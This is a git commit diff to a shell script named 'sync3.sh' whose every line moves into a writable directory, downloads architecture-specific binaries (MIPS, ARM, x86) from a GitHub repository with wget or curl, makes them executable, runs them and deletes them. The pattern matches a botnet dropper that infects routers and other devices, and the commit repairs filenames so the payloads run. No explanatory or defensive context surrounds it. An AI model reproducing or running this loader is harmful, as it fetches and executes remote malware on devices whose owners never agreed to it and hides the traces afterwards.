01db2929ad996d24578c3b4d69b9fc299cf65be5
davidsantos3825 <davidsantos3825@gmail.com>
2025-04-20 01:23:17 -0300

    Update sync3.sh

--- sync3.sh
+++ sync3.sh
@@ -1,14 +1,14 @@
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/davidsantos3825/robopopgay/refs/heads/main/sync.mips; chmod +x mips; ./mips; rm -rf mips
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/davidsantos3825/robopopgay/refs/heads/main/sync.mipsel; chmod +x mipsel; ./mipsel; rm -rf mipsel
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/davidsantos3825/robopopgay/refs/heads/main/sync.arm7; chmod +x armv7l; ./armv7l; rm -rf armv7l
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/davidsantos3825/robopopgay/refs/heads/main/sync.arm6; chmod +x armv6l; ./armv6l; rm -rf armv6l
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/davidsantos3825/robopopgay/refs/heads/main/sync.arm5; chmod +x armv5l; ./armv5l; rm -rf armv5l
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/davidsantos3825/robopopgay/refs/heads/main/sync.arm4; chmod +x armv4l; ./armv4l; rm -rf armv4l
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://github.com/davidsantos3825/robopopgay/raw/refs/heads/main/sync.sync.x86; chmod +x x86_64; ./x86_64; rm -rf x86_64
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O https://raw.githubusercontent.com/davidsantos3825/robopopgay/refs/heads/main/sync.mips; chmod +x mips; ./mips; rm -rf mips
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O https://raw.githubusercontent.com/davidsantos3825/robopopgay/refs/heads/main/sync.mipsel; chmod +x mipsel; ./mipsel; rm -rf mipsel
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O https://raw.githubusercontent.com/davidsantos3825/robopopgay/refs/heads/main/sync.arm7; chmod +x armv7l; ./armv7l; rm -rf armv7l
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O https://raw.githubusercontent.com/davidsantos3825/robopopgay/refs/heads/main/sync.arm6; chmod +x armv6l; ./armv6l; rm -rf armv6l
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O https://raw.githubusercontent.com/davidsantos3825/robopopgay/refs/heads/main/sync.arm4; chmod +x armv5l; ./armv5l; rm -rf armv5l
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O https://raw.githubusercontent.com/davidsantos3825/robopopgay/refs/heads/main/sync.arm4; chmod +x armv4l; ./armv4l; rm -rf armv4l
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O https://github.com/davidsantos3825/robopopgay/raw/refs/heads/main/sync.sync.x86; chmod +x x86_64; ./x86_64; rm -rf x86_64
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/davidsantos3825/robopopgay/refs/heads/main/sync.mips; chmod +x sync.mips; ./sync.mips; rm -rf sync.mips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/davidsantos3825/robopopgay/refs/heads/main/sync.mipsel; chmod +x sync.mipsel; ./sync.mipsel; rm -rf sync.mipsel
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/davidsantos3825/robopopgay/refs/heads/main/sync.arm7; chmod +x sync.arm7; ./sync.arm7; rm -rf sync.arm7
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/davidsantos3825/robopopgay/refs/heads/main/sync.arm6; chmod +x sync.arm6; ./sync.arm6; rm -rf sync.arm6
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/davidsantos3825/robopopgay/refs/heads/main/sync.arm5; chmod +x sync.arm5; ./sync.arm5; rm -rf sync.arm5
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/davidsantos3825/robopopgay/refs/heads/main/sync.arm4; chmod +x sync.arm4; ./sync.arm4; rm -rf sync.arm4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://github.com/davidsantos3825/robopopgay/raw/refs/heads/main/sync.x86; chmod +x sync.x86; ./sync.x86; rm -rf sync.x86
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O https://raw.githubusercontent.com/davidsantos3825/robopopgay/refs/heads/main/sync.mips; chmod +x sync.mips; ./sync.mips; rm -rf sync.mips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O https://raw.githubusercontent.com/davidsantos3825/robopopgay/refs/heads/main/sync.mipsel; chmod +x sync.mipsel; ./sync.mipsel; rm -rf sync.mipsel
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O https://raw.githubusercontent.com/davidsantos3825/robopopgay/refs/heads/main/sync.arm7; chmod +x sync.arm7; ./sync.arm7; rm -rf sync.arm7
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O https://raw.githubusercontent.com/davidsantos3825/robopopgay/refs/heads/main/sync.arm6; chmod +x sync.arm6; ./sync.arm6; rm -rf sync.arm6
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O https://raw.githubusercontent.com/davidsantos3825/robopopgay/refs/heads/main/sync.arm4; chmod +x sync.arm4; ./armv5l; rm -rf sync.arm4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O https://raw.githubusercontent.com/davidsantos3825/robopopgay/refs/heads/main/sync.arm4; chmod +x sync.arm4; ./armv4l; rm -rf sync.arm4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O https://github.com/davidsantos3825/robopopgay/raw/refs/heads/main/sync.x86; chmod +x sync.x86; ./sync.x86; rm -rf sync.x86
